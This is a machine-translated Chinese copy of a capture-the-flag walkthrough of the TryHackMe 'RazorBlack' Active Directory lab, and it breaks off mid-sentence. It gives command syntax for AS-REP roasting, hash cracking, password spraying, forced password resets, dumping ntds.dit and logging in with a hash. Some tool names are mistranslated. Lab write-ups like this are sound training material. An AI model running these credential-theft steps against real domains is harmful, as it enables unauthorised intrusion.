<html>
<head>
<title>RazorBlack: Active Directory Room From TryHackMe By Hashar Mujahid</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">RazorBlack:来自TryHackMe的活动目录室</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/razorblack-active-directory-room-from-tryhackme-by-hashar-mujahid-52985f24d929?source=collection_archive---------1-----------------------#2022-08-09">https://infosecwriteups.com/razorblack-active-directory-room-from-tryhackme-by-hashar-mujahid-52985f24d929?source=collection_archive---------1-----------------------#2022-08-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c4dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些家伙自称黑客。你能告诉他们谁是老板吗？？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/03f1dab29e61988e7a07da4c7b3cd729.png" data-original-src="https://miro.medium.com/v2/resize:fit:1012/format:webp/1*tCQ6yBOpEMHtfJlT0hGtAg.jpeg"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">剃刀黑</figcaption></figure><p id="fae9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">初始枚举:</strong></p><p id="17db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以从nmap端口扫描开始，看看我们的目标正在运行哪些服务。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="9727" class="lc ld iq ky b gy le lf l lg lh">sudo nmap -sC -sV -p- --min-rate 1500 &lt;Target-IP&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/4bc8a232028024afa6748729ad6cc6bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xsN5ht2teDeTzrabzp13NQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Nmap扫描</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi ln"><img src="../Images/5867d8e72f27740cd59f0a4edebbdf5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xEJkgoTjdT9esC7x8cOsOw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">域名</figcaption></figure><p id="86cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的目标DNS是“raz0rblack.thm”。让我们将它添加到hosts文件中。</p><p id="5694" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">并继续枚举。</p><p id="95c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们打开了Smb，让我们尝试列举一些共享。</p><p id="34f5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">中小企业枚举:</strong></p><p id="800a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了许多工具，但看起来我们无法枚举份额。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/5a52d7d73d0f26b060325fc7d2bb9307.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cf5vFozQsl3N3_s_RqoTFA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Crackmapexec</figcaption></figure><p id="ebf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">使用Kerbrute进行用户枚举:</strong></p><p id="9dcb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们也许可以使用Kerberos枚举有效用户，但是。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/c969e1e4469f70529a6103578710f4db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yqKvQrX5EJq4qTDJ6VfWKA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">克尔布鲁特</figcaption></figure><p id="ad27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们找不到任何其他用户。</p><p id="8064" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> RPC枚举:</strong></p><p id="2747" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在端口111上有RPC，让我们试着列举一下。关于如何枚举RPC，hakticks上有很好的指导。</p><div class="lo lp gp gr lq lr"><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">111/TCP/UDP测试端口映射器</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">https://medium . com/@ sebnemK/how-to-bypass-filtered-port mapper-port-111-27ce e52416 BC</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="ma l"><div class="mb l mc md me ma mf kr lr"/></div></div></a></div><p id="4197" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在阅读说明书的过程中，我发现了一些有趣的事情。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi mg"><img src="../Images/9c7daef46b2ad8b567d5a67238e66480.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VM-eJQ6abQTRJ8wMcT0_uA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">哈克特里克斯</figcaption></figure><p id="cf72" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我没记错的话，我们确实有一个NFS在2049端口上运行。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="2a9f" class="lc ld iq ky b gy le lf l lg lh">We can run  showmount -e &lt;ip-address&gt; to list any shared directories</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/30ee2241a96ff5180dddeef6a8ae01f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lZtfvJ-XKYF9gH09MAAiMQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">秀芒特</figcaption></figure><p id="3c99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到有一个/users目录。我们可以挂载到这个目录，并获取该目录中的内容。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/ef0dd627d22b394414260365767f120b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AuVjZ58arQ5VbpZYmOY2og.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">安装/用户</figcaption></figure><p id="15dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以检索sbradley.txt .中的标志，还可以查看employee_status.xlsx中的标志。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi mh"><img src="../Images/d1040f1c2d5c359c38eabbe7dd7bfff7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*U8qRgSNoQ17Qk2FraLdumA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">员工。xlxs</figcaption></figure><p id="0b4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有一个用户名列表，但我们首先必须将它们更改为AD使用的命名约定。正如我们在名为sbradley.txt的目录文件中所看到的，我们需要将每个用户名更改为名字的第一个字符，后面跟着姓氏。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mi mj l"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">格式化用户名</figcaption></figure><p id="add0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">as重新发布:</strong></p><p id="dc12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了一个希望有效的用户名列表，我们可以应用ASEProasting技术来获取禁用了预认证的用户的NTML散列。</p><p id="356e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想了解什么是无菌烘烤，你可以看看康达的这个视频。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mk mj l"/></div></figure><p id="b611" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可以帮助我们实现这一技术的工具是GetNPUsers.py，它是impacket的一部分。</p><p id="78f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">语法:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="34e8" class="lc ld iq ky b gy le lf l lg lh">GetNPUsers.py -no-pass -usersfile validusers.txt Domainame/</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/af9ea05cf7d20786bd40ad20f563efe0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dn4ZKtzRblK3vMXbS0OK6Q.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">as重新发布</figcaption></figure><p id="f872" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了用户twilliams的散列，因为他没有启用“预认证”。</p><p id="8fd7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要使用hashcat来破解hash。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="d170" class="lc ld iq ky b gy le lf l lg lh">hashcat -m 18200 hash &lt;wordlist path&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/934ac269ac7831968d929d201d9b4f8b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W9Bef58C592aGFcDh5VBHA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">哈希卡特</figcaption></figure><p id="dfd4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了用户名twilliams和他的密码。我们可以试着列举出威廉夫妇的股份。</p><p id="b4d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">百万股:</strong></p><p id="551c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用smbclient或smbmap来检索份额。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/9295d4a4a850d1d92d2faa22a6ae9d82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WNzDB0Z6w_4fOFAwdSlelw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">分享</figcaption></figure><p id="8809" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">其他所有共享除了垃圾都没用。让我们连接到它。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/a8e11a7f4359432fb5915640e6fff040.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G_cFwCa_f4XNExijZqeaew.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">拒绝访问</figcaption></figure><p id="b54d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">密码喷涂:</strong></p><p id="c297" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以做的是使用crackmapexec，并使用一种称为密码喷洒的技术来查看是否有其他用户正在使用相同的密码。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="2a44" class="lc ld iq ky b gy le lf l lg lh">crackmapexec smb &lt;ip&gt; -u &lt;usernames&gt; -p &lt;passwords&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/6f2105f7dd2c2c6b0418c695eb1a106b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xRoywIbVLxzRdsDhFd1M-Q.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">口令喷涂</figcaption></figure><p id="e030" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到用户sbradley有一条必须更改其密码的消息，这意味着我们有相同的密码。我们可以设置他的新密码并用它登录。</p><p id="1679" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用smbpasswd工具为他设置一个新密码。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="6f75" class="lc ld iq ky b gy le lf l lg lh">smbpasswd -r &lt;ip&gt; -U &lt;user&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/002ee793d413e197ccd15b8a0fc7927f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*prvNsQMoCwhZaei5Qimd5g.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Smbpasswd</figcaption></figure><p id="9475" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们连接到共享。使用用户sbradley和您设置的密码。我把它设置为smbpassword101。</p><p id="cc79" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可能会发现下载zip文件很困难。</p><p id="f2c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">可以用smbget下载</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/f805328cd925a9c27a4ebb01e29524f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pKx6TlI2TGKDilUuzuRELQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">smbget</figcaption></figure><p id="83d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们也有聊天记录。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="a18f" class="lc ld iq ky b gy le lf l lg lh">┌──(kali㉿kali)-[~/Desktop/CTFs/Razorblack.thm]<br/>└─$ cat chat_log_20210222143423.txt <br/>sbradley&gt; Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.<br/>Administrator&gt; What vulnerability??<br/>sbradley&gt; That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.<br/>Administrator&gt; I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.<br/>sbradley&gt; Hey you won't believe what I am seeing.<br/>Administrator&gt; Now, don't say that you ran the exploit.<br/>sbradley&gt; Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.<br/>sbradley&gt; I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.<br/>Administrator&gt; I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.<br/>Administrator&gt; But, Before I die I will kill your WinRM access..........<br/>sbradley&gt; I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.<br/>sbradley&gt; Hey Administrator are you there ...<br/>sbradley&gt; Administrator .....</span><span id="43c4" class="lc ld iq ky b gy ml lf l lg lh">The administrator died after this incident.</span><span id="55d4" class="lc ld iq ky b gy ml lf l lg lh">Press F to pay respects</span></pre><p id="b076" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们的zip中有ntds.dit，让我们解压缩它。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/2f2b14f115c6f1d9ac52904e4f29cabb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JfVg9HdWfloMx5K_wHo8jQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">受密码保护</figcaption></figure><p id="6ddf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的zip文件是受密码保护的，我们可以使用zip2john来获得密码哈希，然后使用john来破解它。</p><p id="a0e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> zip2john </strong>:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="4d3c" class="lc ld iq ky b gy le lf l lg lh">zip2john experiment_gone_wrong.zip &gt; ziphash.txt</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/adf188f5149a6831c5d4db53726ec2ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i_Y6n09tOBqMMXnz1fqhtA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">zip2john</figcaption></figure><p id="6f5a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">约翰</strong>:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="1408" class="lc ld iq ky b gy le lf l lg lh">john --wordlist=rockyou.txt ziphash.txt</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/4a60b28c20c01e8b5fe91613c19c33a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bqQiCMDGIIbhq6vacBAsmA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">约翰</figcaption></figure><p id="7d0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们拉开拉链。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/fcc598d8c8839b2cc082cf0a01fc5ba4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OE_iLoCT3okKUqY4JtS58g.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">拉开</figcaption></figure><p id="295a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了ntds.dit和system.hieve。</p><p id="b2fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用secretsdumps.py来取消这些文件的阴影。</p><p id="5533" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Secretsdump.py: </strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/a0b2098b396be360c350da5ba46bf942.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-q42WV2Jvgu7xWOWiAeSEw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Secretsdump.py</figcaption></figure><p id="5055" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将在工作目录中创建一个ntds.unshadowed文件。</p><p id="46e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们只需要回答问题。</p><p id="0014" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们想使用散列来寻找答案，我们需要做一些格式化</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi mm"><img src="../Images/2a8bd725dc313d0322c4002a19748bd1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*99k3GYk6b2L-Ri3xCfnJJw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">例子</figcaption></figure><p id="0835" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们看到我们需要的散列在第四个分隔符':'之后。</p><p id="640f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用awk只获取ntml散列，并将它们保存在一个单独的文件中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/c3beb282847bad081083d97603e41076.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ckeIaNA-dPY2jh_6xhFXQw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">格式化</figcaption></figure><p id="d96a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">柳德米拉的杂烩:</p><p id="d5af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以用crackmapexec暴力破解smb，得到lvetrova的有效散列。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/d90ee755aa0b1800c7176a9583590608.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ip4gUoO4VTIN18oJtQnmnw.png"/></div></div></figure><p id="3773" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在有了散列，我们可以使用evil-winrm登录。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/0faa7f0489ac5e550ec849ce19666a7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eN6wLg5u8ei6E8R_ot1DZw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">登录和PS凭据</figcaption></figure><p id="31ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的标志编码在Pscredentials中，我们可以使用它进行解码。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/1b1c42d3e32f0622b1e57ff388ae2967.png" data-original-src="https://miro.medium.com/v2/resize:fit:1384/format:webp/1*IEdY4JS2N33NF72YHWgPnw.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/2b279575cf3e8b29893807ac4c63031d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vnGibwGtbCKL3DIsMh7S9Q.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">不成功的</figcaption></figure><p id="5149" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上述方法失败了。我们也可以试试这个方法。</p><div class="lo lp gp gr lq lr"><a href="https://stackoverflow.com/questions/7468389/powershell-decode-system-security-securestring-to-readable-password" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">PowerShell -解码系统。安全性。获取可读密码</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">我想破解一个系统的密码。安全性。获取可读密码。$password =…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">stackoverflow.com</p></div></div><div class="ma l"><div class="mo l mc md me ma mf kr lr"/></div></div></a></div><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="f8ec" class="lc ld iq ky b gy le lf l lg lh"><strong class="ky ir">To encode:</strong></span><span id="1e3c" class="lc ld iq ky b gy ml lf l lg lh">$password = convertto-securestring "TestPassword" -asplaintext -force<br/>$credentials = New-Object System.Net.NetworkCredential("TestUsername", $password, "TestDomain")<br/><strong class="ky ir">TO DECODE:</strong><br/>$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($credentials.password)<br/>$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)<br/>[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)<br/>$result</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/58c128d71e017bc253b56b1d3539b75d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*deyebnn9OgX2JtIFQgrV0g.png"/></div></div></figure><p id="1a5e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Users目录中，我发现了一个新的用户名xyan1d3。将其添加到我们的用户名列表中。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/52545ab0b4cf29a416e3df84b69abf90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TGgk_H2yIQUKw25167MB1w.png"/></div></div></figure><p id="0920" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以通过广播来寻找服务票。</p><p id="e54a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">Kerberos认证:</strong></p><p id="9965" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Kerberoasting认证是一种利用后攻击技术，它试图泄露Active 